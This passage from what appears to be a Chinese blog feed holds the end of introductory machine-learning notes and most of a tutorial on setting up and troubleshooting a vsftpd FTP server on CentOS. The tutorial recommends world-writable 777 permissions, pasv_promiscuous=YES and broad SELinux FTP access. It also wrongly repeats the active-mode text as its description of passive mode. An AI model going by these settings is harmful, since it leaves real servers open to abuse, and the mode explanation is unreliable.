title="一些基本概念"></a>一些基本概念</h4><p>机器学习、包括下面提到的深度学习都有自己的一些元素，也算是一些概念，主要是：<code>训练集</code>、<code>测试集</code>、<code>特征值</code>、<code>监督学习</code>、<code>非监督学习</code>、<code>半监督学习</code>、<code>分类</code>、<code>回归</code>。下面对主要概念进行解释：</p><p>概念学习：从有关某个布尔函数的输入输出训练样例中推断出该布尔函数，概念定义在实例集合之上；<br>训练集（<code>training set</code>）：又称训练样例，用来训练、产生模型或算法的数据集；<br>测试集（<code>testing set</code>）：又称测试样例，专门用来测试训练好的模型或算法的数据集；<br>特征向量（<code>feature vector</code>）：属性的集合，通常用一个向量来表示，附属于一个实例；<br>标记（<code>label</code>）：实例类别的标记，即结果的类型，包括正例（positive example）和反例（negative example）;<br>分类（<code>classification</code>）：目标标记为类别型数据（category）;<br>回归（<code>regression</code>）：目标标记为连续性数值（continuous numeric value）;<br>有监督学习（<code>supervised learning</code>）：训练集数据有类别标记，即训练集的样例存在最终的结果；<br>无监督学习（<code>unsupervised learning</code>）：训练集数据无类别标记；<br>半监督学习（<code>semi-supervised learning</code>）：训练集数据部分有类别标记、部分没有类别标记。</p><h4 id="机器学习步骤"><a href="#机器学习步骤" class="headerlink" title="机器学习步骤"></a>机器学习步骤</h4><ul><li>1、把数据集拆分为<code>训练集</code>和<code>测试集</code></li><li>2、用训练集和训练集的<code>特征向量</code>来训练算法</li><li>3、用训练出的算法在测试集上进行评估（可能涉及调整参数，用到<code>验证集</code>（<code>parameter set</code>））</li></ul><h4 id="算法评估"><a href="#算法评估" class="headerlink" title="算法评估"></a>算法评估</h4><p>对一个机器学习算法性能的评估，主要考虑一下五个方面：</p><ul><li>1、<code>准确率</code>：执行结果的准确度</li><li>2、<code>速度</code>：执行速度的快慢</li><li>3、<code>强壮性</code>：数据的个别值缺失时能否对数据进行准确处理</li><li>4、<code>可规模性</code>：数据集很大的时候算法是否仍然有效</li><li>5、<code>可解释性</code>：算法处理数据的结果可解释的程度</li></ul><h3 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h3><p>了解了机器学习的基本知识，再往深里说是<code>深度学习（Deep Learning, DL）</code>，它是基于机器学习延伸出的一个新领域，由以人脑结构为启发的<code>神经网络算法（NNs）</code>为起源加之模型结构深度的增加发展，并伴随大数据和计算能力的提高而产生的一系列算法。<br>深度学习被广泛应用于图像处理与计算机视觉、自然语言处理以及语音识别等领域。</p><p>对于深度学习，主要对<code>神经网络</code>相关的算法进行学习，这也是目前应用最为广泛的机器学习算法了。</p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p><code>神经网络</code>（<code>NNs</code>），也称<code>人工神经网络</code>（<code>Artificial Neural Networks</code>，简写为<code>ANNs</code>）或称作<code>连接模型</code>（<code>Connection Model</code>），它是一种模仿动物神经网络行为特征，进行分布式并行信息处理的算法数学模型。这种网络依靠系统的复杂程度，通过调整内部大量节点之间相互连接的关系，从而达到处理信息的目的。</p><p>它机器学习得以发展出深度学习的关键所在，以人脑中的神经网络为启发产生的机器学习算法。</p><h4 id="多层向前神经网络-Muiltilayer-Feed-Forward-Neural-Network"><a href="#多层向前神经网络-Muiltilayer-Feed-Forward-Neural-Network" class="headerlink" title="多层向前神经网络(Muiltilayer Feed-Forward Neural Network)"></a>多层向前神经网络(Muiltilayer Feed-Forward Neural Network)</h4><p>主要有三部分组成：<code>输入层</code>（<code>input layer</code>），<code>隐藏层</code>（<code>hidden layers</code>），<code>输出层</code>（<code>output layer</code>）</p><p><img src="http://ggb0n.cool/images/NN01.png" alt=""></p><p>每层由<code>单元</code>（<code>unit</code>，也称为<code>神经元</code>）组成，输入层将训练集的实例特征向量进行传入，经过连接结点的<code>权重</code>（<code>weight</code>）传入下一层，上一层的输出是下一层的输入。隐藏层的数量是任意的，输入层和输出层只有一层，不过一般算层数时不将输入层计算在内。</p><p>其工作过程大致是：将输入的实例值进行加权求和，再经过非线性方程转化输出到下一层。理论上讲，当隐藏层足够多、训练集足够大时，可以模拟出任何方程。</p><h4 id="设计神经网络结构"><a href="#设计神经网络结构" class="headerlink" title="设计神经网络结构"></a>设计神经网络结构</h4><p>使用神经网络训练数据之前，必须确定神经网络的层数，以及每层单元的个数。</p><p>特征向量在被传入输入层时通常被先<code>标准化</code>（<code>normalize</code>）到<code>0</code>和<code>1</code>之间，目的是加速学习的过程，但是输入的特征值类型可能是<code>离散型</code>的，也可能是<code>连续型</code>的。对于离散型的变量，可以通过编码成每一个输入单元对应一个特征值可能赋的值。例如</p><blockquote><p>特征值<code>A</code>可能取三个值<code>（a0、a1、a2）</code>，那么可以使用<code>3</code>个输入单元来表示<code>A</code>。如果<code>A=a0</code>，则表示<code>a0</code>的单元值取<code>1</code>，其余取<code>0</code>；如果<code>A=a1</code>，则表示<code>a1</code>的单元值取<code>1</code>，其余取<code>0</code>。</p></blockquote><p>神经网络既可以解决<code>分类问题</code>，也可以解决<code>回归问题</code>。分类问题即为结果是离散型的问题，比如预测哪个品牌的电脑卖得更好；回归问题即结果是连续型的问题，比如预测某地的房价。<br>分类问题居多，因此主要学习分类问题的解决，对于该类问题，如果是两类，用一个输出单元表示即可，即<code>0</code>和<code>1</code>；多于两类则每一个类别用一个输出单元表示，因此输出层的单元数量通常等于类别的数量。</p><p>对于隐藏层数的设置，如果没有明确规则，则可以根据实验测试和误差，以及准确度来实验并作出调整。准确度的测试可以利用测试集来进行测试。不过还有一种常用的测试方法：<code>交叉验证方法</code>。</p><h4 id="交叉验证方法（Cross-Validation）"><a href="#交叉验证方法（Cross-Validation）" class="headerlink" title="交叉验证方法（Cross-Validation）"></a>交叉验证方法（Cross-Validation）</h4><p>将数据集分为<code>n</code>份，第一次将第一份作为测试集其余作为训练集进行训练和测试，第二层选择第二份作为测试集其余作为训练集进行训练和测试，依次类推进行。</p><p><img src="http://ggb0n.cool/images/NN02.png" alt=""></p><h4 id="Backpropagation算法"><a href="#Backpropagation算法" class="headerlink" title="Backpropagation算法"></a>Backpropagation算法</h4><p>该算法可以说是其他神经网络算法的基本，通过<code>迭代性</code>的训练集输入来处理训练集中的实例，对比通过神经网络处理后输出层的预测值与训练集真实值之间的差，来<code>反向地</code>以最小化误差调节每个连接之间的权重，以此方式逐渐地进行训练。</p><p>算法的要素如下：</p><blockquote><p>输入：数据集<code>D</code>、学习率<code>L</code>、一个多层向前神经网络<br>输出：一个训练好的神经网络<br>起始状态时需要初始化<code>权重</code>、<code>偏向</code>（<code>Bias</code>，每个单元都有一个偏向，相当于上层传到当前结点的一个偏移）：随机初始化值在<code>-1</code>到<code>1</code>之间，或者<code>-0.5</code>到<code>0.5</code>之间。</p></blockquote><p>对于一个训练实例，执行以下步骤：</p><ul><li>1、由输入层向前传送，传送时需要对每个单元进行加权，然后加上传入到的目标结点的偏向值，最后对加权值进行非线性的转化，然后传送给下层结点。如下图：</li></ul><p><img src="http://ggb0n.cool/images/NN03.png" alt=""></p><ul><li>2、根据误差进行反向传送</li></ul><p><img src="http://ggb0n.cool/images/NN04.png" alt=""></p><ul><li>3、按照上述两步，输出训练集不同的数据进行多次的向前传送和反向传送进行更新，终止条件：<ul><li>权重的更新低于某个阈值</li><li>预测的错误率低于某个阈值</li><li>达到预设一定的循环次数</li></ul></li></ul><h4 id="非线性转化方程"><a href="#非线性转化方程" class="headerlink" title="非线性转化方程"></a>非线性转化方程</h4><p><code>sigmoid</code>函数（<code>S曲线</code>）用来作为转化方程，sigmoid函数曲线形如下图：</p><p><img src="http://ggb0n.cool/images/NN05.png" alt=""></p><p>通常有两种：<a href="[https://zh.wikipedia.org/wiki/%E5%8F%8C%E6%9B%B2%E5%87%BD%E6%95%B0](https://zh.wikipedia.org/wiki/双曲函数)">双曲函数</a>和<a href="https://zh.wikipedia.org/wiki/%E9%82%8F%E8%BC%AF%E5%87%BD%E6%95%B8">逻辑函数</a></p><p>关于机器学习的知识很多，我主要学习一些神经网络的东西，后面会继续记录。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近由于一些需要在学习机器学习，B站上找了&lt;a href=&quot;https://www.bilibili.com/video/av59606777&quot;&gt;一个系列&lt;/a&gt;的视频，感觉还行，对机器学习、深度学习好好学习学习，做一些简单的记录。
    
    </summary>
    
    
      <category term="机器学习" scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Machine Learning" scheme="http://ggb0n.cool/tags/Machine-Learning/"/>
    
      <category term="Neural Network" scheme="http://ggb0n.cool/tags/Neural-Network/"/>
    
  </entry>
  
  <entry>
    <title>FTP服务器搭建及典型问题的解决</title>
    <link href="http://ggb0n.cool/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"/>
    <id>http://ggb0n.cool/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/</id>
    <published>2020-04-03T01:59:36.000Z</published>
    <updated>2020-04-22T00:14:03.093Z</updated>
    
    <content type="html"><![CDATA[<p>SSH管理远程Linux服务器少不了文件的传输，虽然<code>lrzsz</code>能够解决本地与远程服务器之间文件传输的问题，使用<code>sz/rz</code>即可，比如：<a id="more"></a></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">sz filename #发送一个文件到本地</span><br><span class="line">sz filename1 filename2 #发送多个文件到本地</span><br><span class="line">sz dir/* #发送dir目录下的所有文件，不包含dir下的文件夹</span><br></pre></td></tr></table></figure><p>从本地传文件到服务器在终端输入<code>rz</code>即可。参考<a href="https://blog.51cto.com/skypegnu1/1538371">这里</a>。</p><p>但是<code>lrzsz</code>处理小文件可以，处理大文件效果就不太好，因此，可以选择另一种方式，没错，搭建一个FTP服务器。而且FTP服务器能支持多人对文件的共享。</p><h3 id="搭建FTP服务器"><a href="#搭建FTP服务器" class="headerlink" title="搭建FTP服务器"></a>搭建FTP服务器</h3><p>我的服务器是CentOS的，因此下面的配置以CentOS下的配置为例，不过其他Linux系统大同小异，根据个人情况配置即可。</p><h4 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h4><p>Linux下轻便的的ftp程序应该就是vsftpd了，这里我们直接yum安装：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yum install -y vsftpd</span><br></pre></td></tr></table></figure><h4 id="配置vsftpd"><a href="#配置vsftpd" class="headerlink" title="配置vsftpd"></a>配置vsftpd</h4><p>vsftpd的配置目录为<code>/etc/vsftpd</code>，包含下列的配置文件：</p><ul><li><code>vsftpd.conf</code>为主要配置文件</li><li><code>ftpusers</code>配置禁止访问 FTP 服务器的用户列表</li><li><code>user_list</code>配置用户访问控制</li></ul><p>这里我们主要对<code>vsftpd.conf</code>进行配置，这里可以先用下面这条命令看初始的配置有哪些：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/vsftpd/vsftpd.conf | grep -v "#" | <span class="built_in">more</span></span><br></pre></td></tr></table></figure><p>各项配置的规则如下：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启匿名登录</span></span><br><span class="line"><span class="attr">anonymous_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 允许使用本地帐户进行FTP用户登录验证</span></span><br><span class="line"><span class="attr">local_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 允许写</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 设置本地用户默认文件掩码022</span></span><br><span class="line"><span class="attr">local_umask</span>=<span class="number">022</span></span><br><span class="line"><span class="comment"># 允许匿名上传</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 允许匿名创建新目录</span></span><br><span class="line"><span class="attr">anon_mkdir_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 同时开放其它权限</span></span><br><span class="line"><span class="attr">anon_other_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 可以发送消息当访问某个目录时</span></span><br><span class="line"><span class="attr">dirmessage_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启上传下载记录</span></span><br><span class="line"><span class="attr">xferlog_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 数据链通过20端口建立</span></span><br><span class="line"><span class="attr">connect_from_port_20</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许其它用户上传匿名文件</span></span><br><span class="line"><span class="comment">#chown_uploads=YES</span></span><br><span class="line"><span class="comment"># 所有用户</span></span><br><span class="line"><span class="comment">#chown_username=whoever</span></span><br><span class="line"><span class="comment"># 日志保存到</span></span><br><span class="line"><span class="comment">#xferlog_file=/var/log/xferlog</span></span><br><span class="line"><span class="comment"># 日志标准输出</span></span><br><span class="line"><span class="attr">xferlog_std_format</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 空闲会话时间</span></span><br><span class="line"><span class="comment">#idle_session_timeout=600</span></span><br><span class="line"><span class="comment"># 数据连接超时时间</span></span><br><span class="line"><span class="comment">#data_connection_timeout=120</span></span><br><span class="line"><span class="comment"># 隔离的安全用户</span></span><br><span class="line"><span class="comment">#nopriv_user=ftpsecure</span></span><br><span class="line"><span class="comment"># 开启异步数据线程</span></span><br><span class="line"><span class="comment">#async_abor_enable=YES</span></span><br><span class="line"><span class="comment"># 开启ASCII协议上传</span></span><br><span class="line"><span class="attr">ascii_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启ASCII协议下载</span></span><br><span class="line"><span class="attr">ascii_download_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启邮箱验证</span></span><br><span class="line"><span class="comment">#deny_email_enable=YES</span></span><br><span class="line"><span class="comment"># 拒绝的邮箱列表</span></span><br><span class="line"><span class="comment">#banned_email_file=/etc/vsftpd/banned_emails</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否允许直接获取子目录信息</span></span><br><span class="line"><span class="comment">#ls_recurse_enable=YES</span></span><br><span class="line"><span class="comment"># 监听IPv4</span></span><br><span class="line"><span class="attr">listen</span>=<span class="literal">NO</span></span><br><span class="line"><span class="comment"># 监听IPv6和监听IPv4</span></span><br><span class="line"><span class="attr">listen_ipv6</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户启用pam认证</span></span><br><span class="line"><span class="attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="comment"># 用户组管理</span></span><br><span class="line"><span class="attr">userlist_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 访问控制</span></span><br><span class="line"><span class="attr">tcp_wrappers</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允使用被动模式</span></span><br><span class="line"><span class="attr">pasv_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 指定使用被动模式时打开端口的最小值</span></span><br><span class="line"><span class="attr">pasv_min_port</span>=<span class="number">10060</span></span><br><span class="line"><span class="comment"># 指定使用被动模式时打开端口的最大值。</span></span><br><span class="line"><span class="attr">pasv_max_port</span>=<span class="number">10090</span></span><br><span class="line"><span class="comment"># 用户宽带限制200kps</span></span><br><span class="line"><span class="comment">#local_max_rate=200000</span></span><br><span class="line"><span class="comment"># 登录后欢迎内容</span></span><br><span class="line"><span class="attr">ftpd_banner</span>=Welcome to My FTP service.</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------开启虚拟用户组参数--------</span></span><br><span class="line"><span class="comment"># 开启虚拟用户</span></span><br><span class="line"><span class="attr">guest_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 主虚拟用户名vsftpd，等下会建立</span></span><br><span class="line"><span class="attr">guest_username</span>=vsftpd</span><br><span class="line"><span class="comment"># 虚拟用户配置（可以对每一个虚拟用户进行单独的权限配置）</span></span><br><span class="line"><span class="attr">user_config_dir</span>=/etc/vsftpd/vconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用限定用户在其主目录下</span></span><br><span class="line"><span class="attr">chroot_local_user</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># 开启用户列表chroot管理</span></span><br><span class="line"><span class="attr">chroot_list_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># chroot管理的用户列表（一行一用户,虚拟用户都要添加进去）</span></span><br><span class="line"><span class="comment"># 当设置用户只能在登录目录时，chroot管理的用户为不受限制，否则相反</span></span><br><span class="line"><span class="attr">chroot_list_file</span>=/etc/vsftpd/chroot_list</span><br><span class="line"><span class="comment"># 允许chroot管理用户进行写操作</span></span><br><span class="line"><span class="attr">allow_writeable_chroot</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------虚拟用户高级参数（请选择一组）--------</span></span><br><span class="line"><span class="comment"># 虚拟用户和本地用户有相同的权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户和匿名用户有相同的权限，默认是NO</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户具有写权限（上传、下载、删除、重命名）</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户不能浏览目录，只能上传文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能下载文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能上传和下载文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能下载文件和创建文件夹，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_mkdir_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟用户只能下载、删除和重命名文件，无其他权限</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_other_write_enable</span>=<span class="literal">YES</span></span><br></pre></td></tr></table></figure><p>而我们不一定每项都进行配置，在初始的基础之上，进行如下配置即可：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 上面已经给了全部配置的含义，自己比对即可</span></span><br><span class="line"><span class="attr">anonymous_enable</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="attr">userlist_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">tcp_wrappers</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">allow_writeable_chroot</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">local_root</span>=/data/ftp/ <span class="comment">#给ftp账户指定主目录</span></span><br><span class="line"><span class="attr">listen_port</span>=<span class="number">60021</span> <span class="comment">#这里也可以不设置，默认ftp是21端口</span></span><br></pre></td></tr></table></figure><p>配置完之后保存，然后重启vsftpd。</p><h4 id="创建FTP用户"><a href="#创建FTP用户" class="headerlink" title="创建FTP用户"></a>创建FTP用户</h4><p>首先创建一个新账户<code>ftpuser</code>：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">useradd ftpuser</span><br></pre></td></tr></table></figure><p>然后为其设置密码：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">passwd ftpuser</span><br></pre></td></tr></table></figure><p>现在这个账户其实是一个可登录的Linux用户，为了安全，我们要限制用户的权限，不能让其登录linux而只能用于登录FTP服务器：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">usermod -s /sbin/nologin ftpuser</span><br></pre></td></tr></table></figure><h4 id="指定主目录"><a href="#指定主目录" class="headerlink" title="指定主目录"></a>指定主目录</h4><p>前面配置文件里看到了我们为ftp用户指定了主目录<code>/data/ftp</code>，但是初始情况该目录可能不存在，需要新建文件目录：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">chmod a-w /data/ftp &amp;&amp; chmod <span class="number">777</span> -R /data/ftp/pub</span><br></pre></td></tr></table></figure><p>这里同时也为目录设置了权限，可以看到<code>pub</code>目录是<code>777</code>权限，文件的上传、下载也就在此目录之下了。</p><p>然后设置为用户主目录：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">usermod -d /data/ftp ftpuser</span><br></pre></td></tr></table></figure><h4 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h4><p>前面的<code>listen_port</code>如果更改的话，也要在防火墙来开放其端口：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">60021</span>/tcp --permanent</span><br></pre></td></tr></table></figure><p>然后重启防火墙：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br></pre></td></tr></table></figure><p>至此，基础的配置也就完毕了，下面进行测试。</p><h3 id="测试服务器及问题发现"><a href="#测试服务器及问题发现" class="headerlink" title="测试服务器及问题发现"></a>测试服务器及问题发现</h3><p>连接FTP服务器可以选用一些FTP客户端软件：<code>FileZilla Client</code>、<code>CuteFTP</code>等很多，我用了<code>FileZilla Client</code>进行测试。</p><p>这里由于FTP的连接有两种模式：<code>主动（POST）</code>和<code>被动（PASV）</code>两种模式：</p><blockquote><p>POST模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。</p><p>PASV模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。</p></blockquote><p>按照前面的基础配置在测试时发现主动和被动模式登录都存在问题</p><h4 id="主动模式连接的问题"><a href="#主动模式连接的问题" class="headerlink" title="主动模式连接的问题"></a>主动模式连接的问题</h4><p>首次连接发现可以登录，但是读取目录列表失败，报错情况如下：<br><img src="http://ggb0n.cool/images/ftp2.png" alt=""></p><p>根据报错提示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">状态:已登录</span><br><span class="line">状态:读取目录列表...</span><br><span class="line">命令:PWD</span><br><span class="line">响应:257 &quot;&#x2F;data&#x2F;ftp&quot;</span><br><span class="line">命令:TYPE I</span><br><span class="line">响应:200 Switching to Binary mode.</span><br><span class="line">命令:PORT xx,xx,xx,xx,216,94</span><br><span class="line">响应:500 Illegal PORT command.</span><br><span class="line">命令:PASV</span><br><span class="line">响应:227 Entering Passive Mode (xx,xx,xx,xx,227,27).</span><br><span class="line">命令:LIST</span><br><span class="line">错误:20 秒后无活动，连接超时</span><br><span class="line">错误:读取目录列表失败</span><br></pre></td></tr></table></figure><p>根据报错日志，不难理解，当成功登录之后，进行目录读取，其实也就是数据传输的时候，因为是主动模式，服务器会主动向客户端这边进行连接，即向<code>21694</code>端口进行连接，然后就报错了，根本原因应该就是客户端机器的防火墙对该端口并没有开放，因此连接肯定是失败的。然后又采用了被动模式进行连接，即服务器开放<code>22727</code>端口等待客户端连接，然而还是失败了，原因何在呢？</p><p>由于一些客观原因，我没有对自己的客户机的防火墙进行更改，而是换用被动模式，当然，也遇到了一些问题。</p><h4 id="被动模式连接的问题"><a href="#被动模式连接的问题" class="headerlink" title="被动模式连接的问题"></a>被动模式连接的问题</h4><p>采用被动连接的方式，首先需要在<code>vsftpd.conf</code>下进行如下配置：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pasv_enable=YES#开启被动模式</span><br><span class="line">pasv_min_port=<span class="number">44550</span>#指定被动模式最小端口</span><br><span class="line">pasv_max_port=<span class="number">44551</span>#指定被动模式最大端口</span><br><span class="line">pasv_promiscuous=YES #关闭被动模式的安全检查(这个检查可以确保数据连接源于同一IP地址)</span><br></pre></td></tr></table></figure><p>重启<code>vsftpd</code>服务</p><p>支持了被动模式，并且指定了端口开放范围，那么我们在防火墙进行端口的配置即可。</p><p>重启防火墙，然后再次测试：<br><img src="http://ggb0n.cool/images/ftp3.png" alt=""></p><p>可以看到目录成功列举了，问题得到解决。</p><h4 id="上传文件失败的问题"><a href="#上传文件失败的问题" class="headerlink" title="上传文件失败的问题"></a>上传文件失败的问题</h4><p>当能成功登录、成功列举目录了之后，最主要的目的当然是文件的上传和下载了，然后当去测试的时候，又出现了问题：<br><img src="http://ggb0n.cool/images/ftp4.png" alt=""></p><p>报错：<code>553 Could not create file.</code></p><p>本来想着很简单，应该是文件夹权限的问题，但是对文件夹改了777，甚至<code>/data</code>都改成777了还是不行，后来查资料，网上说可能是<code>SELinux</code>的问题，这是个什么呢？</p><blockquote><p>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。NSA是在Linux社区的帮助下开发了一种访问控制体系，在这种访问控制体系的限制下，进程只能访问那些在他的任务中所需要文件。 –百科</p><p>SELinux 主要作用就是<strong>最大限度地减小系统中服务进程可访问的资源</strong>（最小权限原则）。</p><p>这里有一篇不错的<a href="https://zhuanlan.zhihu.com/p/30483108">文章</a>可以参考。</p></blockquote><p>那么我们关闭SELinux试试：<code>setenforce 0</code>，然后测试一下看看：<br><img src="http://ggb0n.cool/images/ftp5.png" alt=""></p><p>果然成了，那就是它的问题了，下面就对其进行配置<br>先看一下权限：<code>getsebool -a | grep ftpd</code></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网上是这样的</span></span><br><span class="line">allow_ftpd_anon_write --&gt; off</span><br><span class="line">allow_ftpd_full_access --&gt; off</span><br><span class="line">allow_ftpd_use_cifs --&gt; off</span><br><span class="line">allow_ftpd_use_nfs --&gt; off</span><br><span class="line">ftpd_connect_db --&gt; off</span><br><span class="line">ftpd_use_passive_mode --&gt; off</span><br><span class="line">ftp_home_dir --&gt; off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是我的服务器是这样的</span></span><br><span class="line">ftpd_anon_write --&gt; off</span><br><span class="line">ftpd_connect_all_unreserved --&gt; off</span><br><span class="line">ftpd_connect_db --&gt; off</span><br><span class="line">ftpd_full_access --&gt; off</span><br><span class="line">ftpd_use_cifs --&gt; off</span><br><span class="line">ftpd_use_fusefs --&gt; off</span><br><span class="line">ftpd_use_nfs --&gt; off</span><br><span class="line">ftpd_use_passive_mode --&gt; off</span><br></pre></td></tr></table></figure><p>系统之间的差异，没办法，但是解决方式是一样的，命令行执行下面两条命令：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setsebool -P ftp_home_dir <span class="number">1</span> #这一条命令我的服务器上没执行成功</span><br><span class="line">setsebool -P allow_ftpd_full_access <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后再开启SELinux：<code>setenforce 1</code></p><p>再次进行测试：<br><img src="http://ggb0n.cool/images/ftp6.png" alt=""></p><p>可以看到，成功上传文件，问题解决。</p><h4 id="下载文件失败的问题"><a href="#下载文件失败的问题" class="headerlink" title="下载文件失败的问题"></a>下载文件失败的问题</h4><p>尝试从服务器上下载文件时，又error了…<br><img src="http://ggb0n.cool/images/ftp1.png" alt=""></p><p>可以看到，下载文件时报错：<code>550 Failed to open file.</code><br>这次问题其实不复杂，很容易想到是文件权限的问题，看一下：<br><img src="http://ggb0n.cool/images/ftp7.png" alt=""><br>可以看到<code>test.cap</code>文件是属于<code>root</code>用户组的，并且权限很小，你一个<code>ftpuser</code>用户去操作它肯定没权限，那简单，改一下不就好了：<code>chmod -R 777 test.cap</code>，再试试：<br><img src="http://ggb0n.cool/images/ftp8.png" 